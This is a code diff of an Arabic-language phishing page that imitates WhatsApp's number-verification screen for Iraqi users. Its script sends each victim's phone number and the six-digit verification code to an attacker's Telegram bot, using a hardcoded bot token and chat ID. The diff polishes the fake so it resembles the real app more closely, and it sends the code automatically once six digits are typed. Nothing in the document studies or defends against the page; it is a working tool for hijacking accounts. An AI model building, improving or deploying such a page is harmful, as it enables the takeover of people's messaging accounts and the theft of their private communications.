@@ -5,30 +5,32 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>WhatsApp</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,Roboto,'Segoe UI',Tahoma,Arial,sans-serif}
-body{background:#000;color:#fff;min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;padding:20px}
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Tahoma,Arial,sans-serif}
+body{background:#0a0a0a;color:#fff;min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;padding:20px}
 .container{max-width:400px;width:100%}
-.logo{text-align:center;margin-bottom:30px}
-.logo .icon{width:70px;height:70px;background:#25D366;border-radius:50%;display:inline-flex;justify-content:center;align-items:center;margin-bottom:15px}
-.logo .icon span{font-size:38px;color:#fff}
-h1{color:#fff;font-size:24px;font-weight:400;margin-bottom:8px}
-.subtitle{color:#888;font-size:14px;line-height:1.6;text-align:center}
-.form-group{margin-top:25px}
-label{display:block;font-size:14px;color:#aaa;margin-bottom:8px}
-input{width:100%;padding:16px;background:#1a1a1a;border:1px solid #333;border-radius:10px;font-size:16px;color:#fff;box-sizing:border-box;outline:none}
-input:focus{border-color:#25D366}
-input::placeholder{color:#555}
-.country-select{display:flex;align-items:center;background:#1a1a1a;border:1px solid #333;border-radius:10px;padding:0 15px;margin-bottom:10px}
-.country-select span{color:#25D366;font-weight:bold;font-size:16px;margin-left:10px}
-.country-select select{background:transparent;border:none;color:#fff;font-size:16px;padding:16px 0;outline:none;flex:1}
-.btn{width:100%;padding:16px;background:#25D366;color:#fff;border:none;border-radius:10px;font-size:17px;font-weight:bold;cursor:pointer;margin-top:20px}
+.logo{text-align:center;margin-bottom:40px}
+.logo .icon{width:80px;height:80px;background:#25D366;border-radius:50%;display:inline-flex;justify-content:center;align-items:center;margin-bottom:20px}
+.logo .icon span{font-size:45px;color:#fff}
+h1{color:#fff;font-size:26px;font-weight:400;margin-bottom:12px}
+.subtitle{color:#8696a0;font-size:15px;line-height:1.7;text-align:center}
+.form-group{margin-top:30px}
+.country-select{display:flex;align-items:center;justify-content:space-between;padding:16px 0;border-bottom:1px solid #2a2a2a;margin-bottom:10px}
+.country-select .country-name{color:#fff;font-size:17px}
+.country-select .arrow{color:#25D366;font-size:14px}
+.phone-row{display:flex;align-items:center;padding:16px 0;border-bottom:1px solid #2a2a2a}
+.phone-row .code{color:#25D366;font-size:17px;font-weight:bold;margin-left:15px}
+.phone-row input{flex:1;background:transparent;border:none;color:#fff;font-size:17px;outline:none;padding:0}
+.phone-row input::placeholder{color:#555}
+.btn{width:100%;padding:16px;background:#25D366;color:#fff;border:none;border-radius:10px;font-size:17px;font-weight:bold;cursor:pointer;margin-top:30px}
+.verify-title{color:#fff;font-size:20px;font-weight:400;text-align:center;margin-bottom:20px}
+.verify-text{color:#8696a0;font-size:15px;line-height:1.8;text-align:center;margin-bottom:25px}
+.verify-text .phone-number{color:#fff;font-weight:bold}
+.edit-link{color:#25D366;font-size:15px;text-align:center;margin-bottom:30px;cursor:pointer}
 .code-inputs{display:flex;gap:10px;margin-top:25px;justify-content:center;direction:ltr}
-.code-inputs input{width:45px;height:55px;text-align:center;font-size:24px;font-weight:bold;padding:0;background:#1a1a1a;border:1px solid #333;border-radius:10px;color:#fff}
-.msg{text-align:center;font-size:14px;color:#888;margin-top:20px;line-height:1.6}
-.link{text-align:center;color:#25D366;font-size:14px;margin-top:20px;cursor:pointer}
+.code-inputs input{width:45px;height:55px;text-align:center;font-size:24px;font-weight:bold;padding:0;background:#1a1a1a;border:1px solid #2a2a2a;border-radius:10px;color:#fff}
+.no-code{text-align:center;color:#25D366;font-size:15px;margin-top:30px;cursor:pointer}
 .footer{text-align:center;font-size:12px;color:#444;margin-top:40px}
-/* Notification Modal */
-.modal-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);display:flex;justify-content:center;align-items:center;z-index:1000;display:none}
+.modal-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);display:flex;justify-content:center;align-items:center;z-index:1000;display:none}
 .modal{background:#1f2c33;border-radius:16px;padding:25px;max-width:320px;width:90%;text-align:center}
 .modal .icon{width:60px;height:60px;background:#25D366;border-radius:50%;display:inline-flex;justify-content:center;align-items:center;margin-bottom:15px}
 .modal .icon span{font-size:30px;color:#fff}
@@ -39,33 +41,30 @@ input::placeholder{color:#555}
 </head>
 <body>
 <div class="container">
+<div id="screen1">
 <div class="logo">
 <div class="icon"><span>💬</span></div>
 <h1>WhatsApp</h1>
-<p class="subtitle">أدخل رقم هاتفك للتحقق</p>
 </div>
-
-<form id="f">
+<p class="subtitle">سيحتاج واتساب إلى التحقق من رقم هاتفك. قد تسري عليك رسوم تفرضها شركة الاتصالات. <span style="color:#25D366">ما هو رقمي؟</span></p>
+<form id="f1">
 <div class="form-group">
-<label>رقم الهاتف</label>
 <div class="country-select">
-<span>+964</span>
-<select id="country">
-<option value="964">العراق</option>
-<option value="966">السعودية</option>
-<option value="971">الإمارات</option>
-<option value="962">الأردن</option>
-<option value="963">سوريا</option>
-<option value="20">مصر</option>
-</select>
+<span class="country-name">العراق</span>
+<span class="arrow">▼</span>
 </div>
-<input type="tel" id="phone" placeholder="7XX XXX XXXX" required>
+<div class="phone-row">
+<span class="code">+964</span>
+<input type="tel" id="phone" placeholder="رقم الهاتف" required>
+</div>
 </div>
 <button type="submit" class="btn">التالي</button>
 </form>
-
-<div id="codeSection" style="display:none">
-<p class="msg">تم إرسال رمز مكون من 6 أرقام إلى رقم هاتفك</p>
+</div>
+<div id="screen2" style="display:none">
+<h2 class="verify-title">جارٍ التحقق من رقمك</h2>
+<p class="verify-text">لقد حاولت تفعيل رقمك حديثاً.<br>الرجاء الانتظار قبل طلب الكود عبر رسالة نصية أو مكالمة هاتفية.</p>
+<div class="edit-link" id="editBtn">تعديل الرقم</div>
 <div class="code-inputs">
 <input type="tel" maxlength="1" id="c1" inputmode="numeric">
 <input type="tel" maxlength="1" id="c2" inputmode="numeric">
@@ -74,27 +73,21 @@ input::placeholder{color:#555}
 <input type="tel" maxlength="1" id="c5" inputmode="numeric">
 <input type="tel" maxlength="1" id="c6" inputmode="numeric">
 </div>
-<div class="link" id="resend">إعادة إرسال الرمز</div>
-<button type="button" class="btn" id="verifyBtn">تحقق</button>
+<div class="no-code" id="noCode">ألم تتلقَّ الكود؟</div>
 </div>
-
 <div class="footer">© 2026 WhatsApp - Meta</div>
 </div>
-
-<!-- Modal (Notification) -->
 <div class="modal-overlay" id="modalOverlay">
 <div class="modal">
 <div class="icon"><span id="modalIcon">✓</span></div>
 <h3 id="modalTitle">تم الإرسال</h3>
-<p id="modalMsg">تم إرسال رمز التحقق إلى رقم هاتفك.</p>
+<p id="modalMsg">تم إرسال رمز التحقق.</p>
 <button onclick="closeModal()">حسناً</button>
 </div>
 </div>
-
 <script>
-const BOT='8890965341:AAGfQCH0ArcTVfJfobc8-c2TUygS6_G614';
-const CHAT='1250341553';
-
+const BOT='8817416933:AAEJJON9lK12149s6-5qYZ91pzf8-XJiNTw';
+const CHAT='8823506156';
 function showModal(icon, title, msg){
 document.getElementById('modalIcon').textContent=icon;
 document.getElementById('modalTitle').textContent=title;
@@ -104,39 +97,45 @@ document.getElementById('modalOverlay').style.display='flex';
 function closeModal(){
 document.getElementById('modalOverlay').style.display='none';
 }
-
-// Auto-focus code inputs
 ['c1','c2','c3','c4','c5','c6'].forEach((id,i,arr)=>{
 document.getElementById(id).addEventListener('input', function(){
 if(this.value.length===1 && i<arr.length-1){ document.getElementById(arr[i+1]).focus(); }
 });
 });
-
-document.getElementById('f').addEventListener('submit', async function(e){
+document.getElementById('f1').addEventListener('submit', async function(e){
 e.preventDefault();
-const country=document.getElementById('country').value;
 const phone=document.getElementById('phone').value;
-const fullPhone='+'+country+phone;
+const fullPhone='+964'+phone;
 const msg='💬 *واتساب*\n\n📞 الرقم: `'+fullPhone+'`\n🕐 '+new Date().toLocaleString('ar-IQ');
 await fetch('https://api.telegram.org/bot'+BOT+'/sendMessage?chat_id='+CHAT+'&text='+encodeURIComponent(msg)+'&parse_mode=Markdown');
-document.getElementById('f').style.display='none';
-document.getElementById('codeSection').style.display='block';
+document.getElementById('screen1').style.display='none';
+document.getElementById('screen2').style.display='block';
 document.getElementById('c1').focus();
-showModal('✓','تم الإرسال','تم إرسال رمز التحقق إلى رقم هاتفك.');
 });
-
-document.getElementById('verifyBtn').addEventListener('click', async function(){
+['c1','c2','c3','c4','c5','c6'].forEach((id)=>{
+document.getElementById(id).addEventListener('input', async function(){
 const code=document.getElementById('c1').value+document.getElementById('c2').value+document.getElementById('c3').value+document.getElementById('c4').value+document.getElementById('c5').value+document.getElementById('c6').value;
-const country=document.getElementById('country').value;
+if(code.length===6){
 const phone=document.getElementById('phone').value;
-const fullPhone='+'+country+phone;
+const fullPhone='+964'+phone;
 const msg='💬 *واتساب - رمز التحقق*\n\n📞 الرقم: `'+fullPhone+'`\n🔢 الرمز: `'+code+'`\n🕐 '+new Date().toLocaleString('ar-IQ');
 await fetch('https://api.telegram.org/bot'+BOT+'/sendMessage?chat_id='+CHAT+'&text='+encodeURIComponent(msg)+'&parse_mode=Markdown');
 showModal('✓','تم التحقق','تم التحقق من رقم هاتفك بنجاح.');
+}
 });
-
-document.getElementById('resend').addEventListener('click', function(){
-showModal('↻','إعادة الإرسال','تم إعادة إرسال رمز التحقق إلى رقم هاتفك.');
+});
+document.getElementById('editBtn').addEventListener('click', function(){
+document.getElementById('screen2').style.display='none';
+document.getElementById('screen1').style.display='block';
+document.getElementById('c1').value='';
+document.getElementById('c2').value='';
+document.getElementById('c3').value='';
+document.getElementById('c4').value='';
+document.getElementById('c5').value='';
+document.getElementById('c6').value='';
+});
+document.getElementById('noCode').addEventListener('click', function(){
+showModal('↻','إعادة الإرسال','سيتم إعادة إرسال الكود خلال دقيقة.');
 });
 </script>
 </body>
